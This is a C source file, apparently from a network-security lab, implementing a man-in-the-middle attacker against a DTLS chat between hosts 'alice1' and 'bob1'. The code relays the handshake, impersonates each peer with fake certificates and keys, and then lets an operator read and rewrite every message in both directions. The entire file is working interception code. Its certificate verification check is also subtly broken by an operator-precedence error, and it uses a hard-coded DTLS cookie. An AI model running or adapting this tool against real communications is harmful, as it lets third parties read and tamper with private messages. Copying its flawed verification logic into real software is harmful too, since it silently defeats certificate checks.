// Import the required header files
#include<stdio.h>           // for printf()
#include<stdlib.h>          // for exit()
#include<netdb.h>           // for gethostbyname()
#include<arpa/inet.h>       // for inet_addr()
#include<string.h>          // for bzero()
#include<unistd.h>          // for close()
#include<netinet/in.h>      // for inet_ntop()
#include<sys/time.h>        // for struct timeval
#include<stdbool.h>         // for bool data type
#include<openssl/ssl.h>     // for SSL algorithms
#include<openssl/err.h>     // for SSL errors
#include<openssl/bio.h>     // for SSL BIO
#include<fcntl.h>           // for fcntl()

// Define the required macros
#define PORT 8001
#define INF 99999
#define MAX_LENGTH 1024

// Define the required global variables
char error[100], client[10], server[10], host[10], serverCRT[30], serverKey[30], clientCRT[30], clientKey[30];

/**
Name        :   retrieveIP()
Description :   Retrieves the IP address of a host given its hostname.
Arguments   :   The hostname and a char buffer to store the ip address, in that order
Return      :   None
**/
void retrieveIP(char *server, char ip[20]) {

    // Declare the required local variables
    struct hostent *info;
    struct in_addr address;

    // Get the host details from the hostname and store in a linked list
    info = gethostbyname(server);

    // Handle the error
    if(!info) {
        bzero(error, sizeof(error));
        sprintf(error, "Unable to get details of host %s\n", server);
        perror(error);
        exit(EXIT_FAILURE);
    }

    // Retrieve the IP address from the linked list, copy it into the IP buffer and return
    memcpy(&address, info->h_addr_list[0], sizeof(struct in_addr));
    sprintf(ip, "%s", inet_ntoa(address));
    return;
}

/**
Name        :   generateCookie()
Description :   Generates a pre-specified cookie and stores it in a buffer.
Arguments   :   Pointer to the SSL connection, buffer for the cookie and the length of the cookie buffer, in that order
Return      :   1
**/
int generateCookie(SSL *connection, unsigned char *cookie, unsigned int *cookie_len) {
    
    // Store the cookie in the buffer, set the cookie length and return
    memcpy(cookie, "server", 6);
    *cookie_len = 6;
    return 1;
}

/**
Name        :   verifyCookie()
Description :   Compares the received cookie with a pre-specified cookie and returns the result.
Arguments   :   Pointer to the SSL connection, buffer for the cookie and the length of the cookie buffer, in that order
Return      :   1 if cookie matches and 0 otherwise
**/
int verifyCookie(SSL *connection, const unsigned char *cookie, unsigned int cookie_len) {
    
    // Compare the received cookie with pre-specified cookie and return result accordingly
    int diff = memcmp(cookie, "server", 6);
    return (diff == 0) ? 1 : 0;
}

/**
Name        :   determinePeers()
Description :   Determines who is server and who is client for the chat.
Arguments   :   The client address and two char buffers to store the hostnames, in that order
Return      :   None
**/
void determinePeers(struct sockaddr_in* clientAddress) {
    
    // Declare the required local variables
    char ip[20];
    struct hostent *info;
    struct in_addr addr;

    // Extract the IP address of the client
    inet_ntop(AF_INET, &(clientAddress->sin_addr), ip, INET_ADDRSTRLEN);
    inet_aton(ip, &addr);
    
    // Get the host details from the IP address and store in a linked list
    info = gethostbyaddr((const char*)&addr, sizeof(addr), AF_INET);

    // Handle the error
    if(!info || !info->h_name) {
        bzero(error, sizeof(error));
        sprintf(error, "Unable to get details of client host %s\n", server);
        perror(error);
        exit(EXIT_FAILURE);
    }

    // Retrieve the hostname from the linked list, copy it into the client buffer
    sprintf(client, "%s", info->h_name);
    
    // Set the buffers accordingly and return
    if(strcmp(client, "alice1") == 0) {
        strcpy(server, "bob1");
        strcpy(serverCRT, "fakebob.crt");
        strcpy(serverKey, "fakebob1-private.pem");
        strcpy(clientCRT, "fakealice.crt");
        strcpy(clientKey, "fakealice1-private.pem");
    }
    else {
        strcpy(server, "alice1");
        strcpy(serverCRT, "fakealice.crt");
        strcpy(serverKey, "fakealice1-private.pem");
        strcpy(clientCRT, "fakebob.crt");
        strcpy(clientKey, "fakebob1-private.pem");
    }
    return;
}

/**
Name        :   chatSSL()
Description :   Defines the procedure for the attacker to maintain the chat over a secure network.
Arguments   :   Pointer to the SSL connection of the client and server, in that order
Return      :   None
**/
void chatSSL(SSL *serverConnection, SSL *clientConnection) {
    
    // Declare the required local variables
    bool keepAlive = true;
    char bufferC[MAX_LENGTH], bufferS[MAX_LENGTH];
    int max_fd, clientSocketFD = SSL_get_fd(clientConnection), serverSocketFD = SSL_get_fd(serverConnection), messageLength;
    char ch;
    fd_set rfds;

    // Begin the chat loop
    while(keepAlive) {

        // Create the FD set instance and add client and server SSL sockets to it
        FD_ZERO(&rfds);
        FD_SET(clientSocketFD, &rfds);
        FD_SET(serverSocketFD, &rfds);
        max_fd = serverSocketFD > clientSocketFD ? serverSocketFD : clientSocketFD;

        // Wait for an event to occur on any of the sockets
        int ret = select(max_fd + 1, &rfds, NULL, NULL, NULL);
        if (ret < 0) {
            sprintf(error, "Select error\n");
            perror(error);
            exit(EXIT_FAILURE);
        }

        // Check if any data is available from the client
        if(FD_ISSET(serverSocketFD, &rfds)) {

            // Read the data from client
            bzero(bufferS, sizeof(bufferS));
            messageLength = SSL_read(serverConnection, bufferS, sizeof(bufferS));
            bufferS[messageLength] = '\0';

            // In case of a normal message
            bzero(bufferC, sizeof(bufferC));
            if(strcmp(bufferS, "chat_close") && strcmp(bufferS, "chat_close_ACK")) {
                
                // Display the message to the attacker
                printf("%s says %s\n", client, bufferS);

                // Allow the attacker to decide what to do with the message
                printf("Do you want to edit ? [y/n]:");
                scanf("%c%*c", &ch);
                
                // Allow the attacker to edit the message
                if(ch == 'y') {

                    // Make sure the attacker doesn't enter a control message
                    do {
                        printf("Enter the new message:");
                        fgets(bufferC, sizeof(bufferC), stdin);
                        bufferC[strlen(bufferC) - 1] = '\0';
                        if(strcmp(bufferC, "chat_close") == 0 || strcmp(bufferC, "chat_close_ACK") == 0)
                            printf("Control messages not allowed. Enter 'exit' to end the chat.\n");
                    }while(strcmp(bufferC, "chat_close") == 0 || strcmp(bufferC, "chat_close_ACK") == 0);
                    
                    // Prepare the control message if the attacker wants to end the chat
                    if(strcmp(bufferC, "exit") == 0)
                        strcpy(bufferC, "chat_close");
                }

                // If the attacker does not want to edit the message, copy the original message
                else
                    strcpy(bufferC, bufferS);
            }

            // If it is a control message, copy the original message
            else
                strcpy(bufferC, bufferS);
            
            // Send the message to the server through the SSL socket
            SSL_write(clientConnection, bufferC, sizeof(bufferC));

            // Notify the attacker about the chat close
            if(strcmp(bufferC, "chat_close") == 0) {
                printf("%s closed the chat.\n", client);
            }

            // Forward the chat_close_ACK from client to server
            else if(strcmp(bufferS, "chat_close_ACK") == 0) {
                keepAlive = false;
                continue;
            }
        }

        // Check if any data is available from the server
        if(FD_ISSET(clientSocketFD, &rfds)) {

            // Read the data from server
            bzero(bufferC, sizeof(bufferC));
            messageLength = SSL_read(clientConnection, bufferC, sizeof(bufferC));
            bufferC[messageLength] = '\0';
            bzero(bufferS, sizeof(bufferS));

            // In case of a normal message
            if(strcmp(bufferC, "chat_close") && strcmp(bufferC, "chat_close_ACK")) {
                
                // Display the message to the server
                printf("%s says %s\n", server, bufferC);

                // Allow the attacker to decide what to do with the message
                printf("Do you want to edit ? [y/n]:");
                scanf("%c%*c", &ch);

                // Allow the attacker to edit the message
                if(ch == 'y') {

                    // Make sure the attacker doesn't enter a control message
                    do {
                        printf("Enter the new message:");
                        fgets(bufferS, sizeof(bufferS), stdin);
                        bufferS[strlen(bufferS) - 1] = '\0';
                        if(strcmp(bufferS, "chat_close") == 0 || strcmp(bufferS, "chat_close_ACK") == 0)
                            printf("Control messages not allowed. Enter 'exit' to end the chat.\n");
                    }while(strcmp(bufferS, "chat_close") == 0 || strcmp(bufferS, "chat_close_ACK") == 0);
                    
                    // Prepare the control message if the attacker wants to end the chat
                    if(strcmp(bufferS, "exit") == 0)
                        strcpy(bufferS, "chat_close");
                }

                // If the attacker does not want to edit the message, copy the original message
                else
                    strcpy(bufferS, bufferC);
            }

            // If it is a control message, copy the original message
            else
                strcpy(bufferS, bufferC);
            
            // Send the message to the client through the SSL socket
            SSL_write(serverConnection, bufferS, sizeof(bufferS));

            // Notify the attacker about the chat close
            if(strcmp(bufferS, "chat_close") == 0) {
                printf("%s closed the chat.\n", server);
            }

            // Forward the chat_close_ACK from server to client
            else if(strcmp(bufferC, "chat_close_ACK") == 0) {
                keepAlive = false;
                continue;
            }
        }
    }
    return;
}

/**
Name        :   intercept()
Description :   Defines the procedure for the attacker to tamper with the chat
Arguments   :   None
Return      :   None
**/
void intercept() {
    
    // Declare the required local variables
    int clientSocketFD, serverSocketFD, serverLength, messageLength, clientLength, status, flag;
    struct sockaddr_in clientAddress, myAddress, serverAddress;
    char myIP[20], serverIP[20], bufferS[MAX_LENGTH], bufferC[MAX_LENGTH];
    struct timeval timeout = {2, 0};
    bool keepAlive = true;
    
    // Try creating a Server Socket and print appropriate message
    bzero(&myAddress, sizeof(myAddress));
    if((serverSocketFD = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        bzero(error, sizeof(error));
        sprintf(error, "Server Socket creation failed.\n");
        perror(error);
        exit(EXIT_FAILURE);
    }

    // Prepare the server address details for binding
    retrieveIP(host, myIP);
    myAddress.sin_addr.s_addr = inet_addr(myIP);
    myAddress.sin_port = htons(PORT);
    myAddress.sin_family = AF_INET;
    memset(&(myAddress.sin_zero), '\0', 8);

    // Try binding the server address to the Socket and print appropriate message
    if(bind(serverSocketFD, (struct sockaddr*)&myAddress, sizeof(struct sockaddr_in)) < 0) {
        bzero(error, sizeof(error));
        sprintf(error, "Server Socket binding failed.\n");
        perror(error);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }

    // Read data from the socket and print appropriate message
    clientLength = sizeof(clientAddress);
    bzero(bufferS, sizeof(bufferS));
    if((messageLength = recvfrom(serverSocketFD, bufferS, sizeof(bufferS), 0, (struct sockaddr*)&clientAddress, &clientLength)) < 0) {
        bzero(error, sizeof(error));
        sprintf(error, "Listening from client failed.\n");
        perror(error);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }
    bufferS[messageLength] = '\0';

    // Determine who is client and who is server based on the client connection received
    determinePeers(&clientAddress);
    
    // Try creating a Client Socket and print appropriate message
    bzero(&serverAddress, sizeof(serverAddress));
    if((clientSocketFD = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        bzero(error, sizeof(error));
        sprintf(error, "Client Socket creation failed.\n");
        perror(error);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }

    // Prepare the server address details for connection
    retrieveIP(server, serverIP);
    serverAddress.sin_addr.s_addr = inet_addr(serverIP);
    serverAddress.sin_port = htons(PORT);
    serverAddress.sin_family = AF_INET;
    setsockopt(clientSocketFD, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    serverLength = sizeof(serverAddress);
    if(connect(clientSocketFD, (struct sockaddr*)&serverAddress, serverLength)) {
        bzero(error, sizeof(error));
        sprintf(error, "Server connection failed.\n");
        perror(error);
        close(clientSocketFD);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }

    // Read data from the socket and print appropriate message
    bzero(bufferS, sizeof(bufferS));
    if((messageLength = recvfrom(serverSocketFD, bufferS, sizeof(bufferS), 0, (struct sockaddr*)&clientAddress, &clientLength)) == -1) {
        bzero(error, sizeof(error));
        sprintf(error, "Listening from client failed.\n");
        perror(error);
        close(clientSocketFD);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }
    bufferS[messageLength] = '\0';
    
    // Receive chat_hello from the client
    chat_hello:
        bzero(bufferC, sizeof(bufferC));
        strcpy(bufferC, bufferS);
        if(sendto(clientSocketFD, bufferC, sizeof(bufferC), 0, (struct sockaddr*)&serverAddress, serverLength) < 0) {
            bzero(error, sizeof(error));
            sprintf(error, "Message sending failed.\n");
            perror(error);
            close(clientSocketFD);
            close(serverSocketFD);
            exit(EXIT_FAILURE);
        }

    // Try to receive chat_ok_reply from the server and handle the packet loss of chat_hello
    bzero(bufferC, sizeof(bufferC));
    if((messageLength = recvfrom(clientSocketFD, bufferC, sizeof(bufferC), 0, (struct sockaddr*)&serverAddress, &serverLength)) < 0)
        goto chat_hello;
    bufferC[messageLength] = '\0';

    // Send the chat_ok_reply to the client
    chat_ok_reply:
        // Send the response to the client through the socket
        bzero(bufferS, sizeof(bufferS));
        strcpy(bufferS, bufferC);
        if(sendto(serverSocketFD, bufferS, sizeof(bufferS), 0, (struct sockaddr*)&clientAddress, clientLength) == -1) {
            bzero(error, sizeof(error));
            sprintf(error, "Replying to client failed.\n");
            perror(error);
            close(clientSocketFD);
            close(serverSocketFD);
            exit(EXIT_FAILURE);
        }

    // Try to receive chat_START_SSL from the client
    bzero(bufferS, sizeof(bufferS));
    messageLength = recvfrom(serverSocketFD, bufferS, sizeof(bufferS), 0, (struct sockaddr*)&clientAddress, &clientLength);
    bufferS[messageLength] = '\0';

    // Handle the packet loss of chat_ok_reply
    if(strcmp(bufferS, "chat_hello") == 0)
        goto chat_ok_reply;
    
    // Send chat_START_SSL to the server
    chat_START_SSL:
        bzero(bufferC, sizeof(bufferC));
        strcpy(bufferC, bufferS);
        if(sendto(clientSocketFD, bufferC, sizeof(bufferC), 0, (struct sockaddr*)&serverAddress, serverLength) < 0) {
            bzero(error, sizeof(error));
            sprintf(error, "Message sending failed.\n");
            perror(error);
            close(clientSocketFD);
            close(serverSocketFD);
            exit(EXIT_FAILURE);
        }

    // Try to receive chat_START_SSL_ACK from the server and handle the packet loss of chat_START_SSL
    bzero(bufferC, sizeof(bufferC));
    if((messageLength = recvfrom(clientSocketFD, bufferC, sizeof(bufferC), 0, (struct sockaddr*)&serverAddress, &serverLength)) < 0)
        goto chat_START_SSL;
    bufferC[messageLength] = '\0';

    // Send chat_START_SSL_ACK to the client
    chat_START_SSL_ACK:
        bzero(bufferS, sizeof(bufferS));
        strcpy(bufferS, bufferC);
        if(sendto(serverSocketFD, bufferS, sizeof(bufferS), 0, (struct sockaddr*)&clientAddress, clientLength) == -1) {
            bzero(error, sizeof(error));
            sprintf(error, "Replying to client failed.\n");
            perror(error);
            close(clientSocketFD);
            close(serverSocketFD);
            exit(EXIT_FAILURE);
        }

    // Set the socket to listen for 5 seconds
    bzero(bufferS, sizeof(bufferS));
    timeout.tv_sec = 5;
    setsockopt(serverSocketFD, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    messageLength = recvfrom(serverSocketFD, bufferS, sizeof(bufferS), 0, (struct sockaddr*)&clientAddress, &clientLength);
    bufferS[messageLength] = '\0';

    // Handle the packet loss of chat_START_SSL_ACK acknowledgement
    if(messageLength > 0 && strcmp(bufferS, "chat_START_SSL") == 0)
        goto chat_START_SSL_ACK;
    
    // Load SSL Library components
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();

    // Setup a new SSL context and handle the error
    SSL_CTX *serverContext = SSL_CTX_new(DTLS_server_method());
    if(!serverContext) {
        bzero(error, sizeof(error));
        sprintf(error, "SSL Context creation failed.\n");
        perror(error);
        close(clientSocketFD);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }
    SSL_CTX *clientContext = SSL_CTX_new(DTLS_client_method());
    if(!clientContext) {
        bzero(error, sizeof(error));
        sprintf(error, "SSL Context creation failed.\n");
        perror(error);
        close(clientSocketFD);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }

    // Configure the appropriate context options
    SSL_CTX_set_mode(serverContext, SSL_MODE_AUTO_RETRY);
    SSL_CTX_set_mode(clientContext, SSL_MODE_AUTO_RETRY);
    SSL_CTX_set_session_cache_mode(serverContext, SSL_SESS_CACHE_SERVER);
    SSL_CTX_set_verify(serverContext, SSL_VERIFY_PEER, NULL);
    SSL_CTX_set_cookie_generate_cb(serverContext, generateCookie);
    SSL_CTX_set_cookie_verify_cb(serverContext, &verifyCookie);
    SSL_CTX_set_timeout(serverContext, 600);
    SSL_CTX_set_verify(clientContext, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, NULL);
    SSL_CTX_set_verify_depth(clientContext, 2);
    
    // Set the security level to 1 and load the private key password
    SSL_CTX_set_default_passwd_cb_userdata(serverContext, host);
    SSL_CTX_set_security_level(serverContext, 1);
    SSL_CTX_set_default_passwd_cb_userdata(clientContext, host);
    SSL_CTX_set_security_level(clientContext, 1);
    
    // Load the server and client certificate
    if(SSL_CTX_use_certificate_file(serverContext, serverCRT, SSL_FILETYPE_PEM) <= 0) {
        bzero(error, sizeof(error));
        sprintf(error, "Certificate loading failed.\n");
        perror(error);
        SSL_CTX_free(serverContext);
        close(clientSocketFD);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }
    if(SSL_CTX_use_certificate_file(clientContext, clientCRT, SSL_FILETYPE_PEM) <= 0) {
        bzero(error, sizeof(error));
        sprintf(error, "Certificate loading failed.\n");
        perror(error);
        SSL_CTX_free(clientContext);
        close(clientSocketFD);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }

    // Load the server and client private key
    if(SSL_CTX_use_PrivateKey_file(serverContext, serverKey, SSL_FILETYPE_PEM) <= 0 ) {
        bzero(error, sizeof(error));
        sprintf(error, "Private Key loading failed.\n");
        perror(error);
        SSL_CTX_free(serverContext);
        close(clientSocketFD);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }
    if(SSL_CTX_use_PrivateKey_file(clientContext, clientKey, SSL_FILETYPE_PEM) <= 0 ) {
        bzero(error, sizeof(error));
        sprintf(error, "Private Key loading failed.\n");
        perror(error);
        SSL_CTX_free(clientContext);
        close(clientSocketFD);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }

    // Check for the validity of private key and certificate of client and server
    if(!SSL_CTX_check_private_key(serverContext)) {
        bzero(error, sizeof(error));
        sprintf(error, "Keys and Certificates do not match.\n");
        perror(error);
        SSL_CTX_free(serverContext);
        close(clientSocketFD);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }
    if(!SSL_CTX_check_private_key(clientContext)) {
        bzero(error, sizeof(error));
        sprintf(error, "Keys and Certificates do not match.\n");
        perror(error);
        SSL_CTX_free(clientContext);
        close(clientSocketFD);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }

    // Load the CA certificate store
    SSL_CTX_load_verify_locations(serverContext, "CAfile.crt", NULL);
    SSL_CTX_load_verify_locations(clientContext, "CAfile.crt", NULL);
    
    // Set up the Bio for server
    BIO *bio = BIO_new_dgram(serverSocketFD, BIO_NOCLOSE);

    // Set up the SSL connections for client and server and handle the error
    SSL *serverConnection = SSL_new(serverContext);
    if(!serverConnection) {
        bzero(error, sizeof(error));
        sprintf(error, "SSL Connection creation failed\n");
        perror(error);
        BIO_free(bio);
        SSL_CTX_free(serverContext);
        close(clientSocketFD);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }
    SSL *clientConnection = SSL_new(clientContext);
    if(!clientConnection) {
        bzero(error, sizeof(error));
        sprintf(error, "SSL Connection creation failed\n");
        perror(error);
        SSL_shutdown(serverConnection);
        SSL_free(serverConnection);
        BIO_free(bio);
        SSL_CTX_free(clientContext);
        close(clientSocketFD);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }

    // Set the appropriate options for both the connections and attach the server connection to the bio
    SSL_set_ciphersuites(serverConnection, "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305");
    SSL_set_ciphersuites(clientConnection, "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305");
    SSL_set_bio(serverConnection, bio, bio);
    SSL_set_options(serverConnection, SSL_OP_COOKIE_EXCHANGE);

    // Set the socket to NON-BLOCKING mode
    flag = fcntl(serverSocketFD, F_GETFL, 0);
    fcntl(serverSocketFD, F_SETFL, flag | O_NONBLOCK);
    
    // Start listening to the BIO for SSL connections
    do {
        status = DTLSv1_listen(serverConnection, (BIO_ADDR*)&clientAddress);
    }while(status <= 0);

    // Accept the SSL connection from the client
    do {
        status = SSL_accept(serverConnection);
    }while(status <= 0);

    // Bind it the client connection to the socket
    if(SSL_set_fd(clientConnection, clientSocketFD) != 1) {
        bzero(error, sizeof(error));
        sprintf(error, "Socket setting failed.\n");
        perror(error);
        SSL_shutdown(serverConnection);
        SSL_free(serverConnection);
        BIO_free(bio);
        SSL_CTX_free(serverContext);
        SSL_shutdown(clientConnection);
        SSL_free(clientConnection);
        SSL_CTX_free(clientContext);
	    close(clientSocketFD);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }

    // Set the socket to NON-BLOCKING mode
    flag = fcntl(clientSocketFD, F_GETFL, 0);
    fcntl(clientSocketFD, F_SETFL, flag | O_NONBLOCK);
    
    // Try establishing SSL connection with the server
    do {
        status = SSL_connect(clientConnection);
    }while(status != 1);
    
    // Verify the Certificate of the client
    if(!SSL_get_peer_certificate(serverConnection) || !SSL_get_verify_result(serverConnection) == X509_V_OK) {
        bzero(error, sizeof(error));
        sprintf(error, "Peer Certificate verification failed.\n");
        perror(error);
        SSL_shutdown(serverConnection);
        SSL_free(serverConnection);
        BIO_free(bio);
        SSL_CTX_free(serverContext);
        SSL_shutdown(clientConnection);
        SSL_free(clientConnection);
        SSL_CTX_free(clientContext);
	    close(clientSocketFD);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }
    
    // Verify the Certificate of the server
    if(!SSL_get_peer_certificate(clientConnection) || !SSL_get_verify_result(clientConnection) == X509_V_OK) {
        bzero(error, sizeof(error));
        sprintf(error, "Peer Certificate verification failed.\n");
        perror(error);
        SSL_shutdown(serverConnection);
        SSL_free(serverConnection);
        BIO_free(bio);
        SSL_CTX_free(serverContext);
        SSL_shutdown(clientConnection);
        SSL_free(clientConnection);
        SSL_CTX_free(clientContext);
	    close(clientSocketFD);
        close(serverSocketFD);
        exit(EXIT_FAILURE);
    }

    // Invoke the function to tamper the chat over the SSL socket
    chatSSL(serverConnection, clientConnection);

    // Free the resources and return
    SSL_shutdown(clientConnection);
    SSL_free(clientConnection);
    SSL_CTX_free(clientContext);
    close(clientSocketFD);
    SSL_shutdown(serverConnection);
    SSL_free(serverConnection);
    SSL_CTX_free(serverContext);
    close(serverSocketFD);
    return;
}

/**
Name        :   main()
Description :   Handles the invoking of all above defined functions.
Arguments   :   Hostnames of the peers involved in the chat
Return      :   Integer 0 on success and EXIT_FAILURE otherwise
**/
int main(int argc, char **argv) {

    // Retrieve the host name
    if(gethostname(host, sizeof(host)) == -1) {
        bzero(error, sizeof(error));
        sprintf(error, "gethostname error");
        perror(error);
        exit(EXIT_FAILURE);
    }

    // Parse and validate the command line arguments
    if(argc != 4 || strcmp(argv[1], "-m")) {
        bzero(error, sizeof(error));
        sprintf(error, "Invalid Command Line Arguments. Refer README.md\n");
        perror(error);
        exit(EXIT_FAILURE);
    }

    // Invoke the function to intercept the chat
    intercept();
    
    return 0;
}